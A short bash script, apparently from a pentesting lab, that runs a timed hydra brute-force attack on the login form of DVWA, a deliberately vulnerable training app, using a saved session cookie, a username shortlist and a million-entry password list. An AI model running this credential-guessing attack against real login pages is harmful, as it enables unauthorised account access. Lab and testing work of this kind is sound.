#!/usr/bin/env bash
source /home/kali/Pentesting/scripts/config/config.sh
echo "Start [$(date "+%Y-%m-%d %H:%M:%S")]: Running hydra"
t0=$(date +%s)

# --- ATTACK ---
# get session id
PHPSESSID=$(grep PHPSESSID /home/kali/Pentesting/utils/dvwa.session | awk -F' ' '{print $7}')
timeout ${hard_timeout_duration_min}m hydra $target_ip_msf http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login\:H=Cookie:security=low; PHPSESSID=${PHPSESSID}" -L /home/kali/Pentesting/utils/top-usernames-shortlist.txt -P /home/kali/Pentesting/utils/10-million-password-list-top-1000000.txt
# --- ATTACK ---

t=$(date +%s)
elapsed_time=$((t - t0))
echo "End [$(date "+%Y-%m-%d %H:%M:%S")]: Running hydra (took $elapsed_time seconds)"
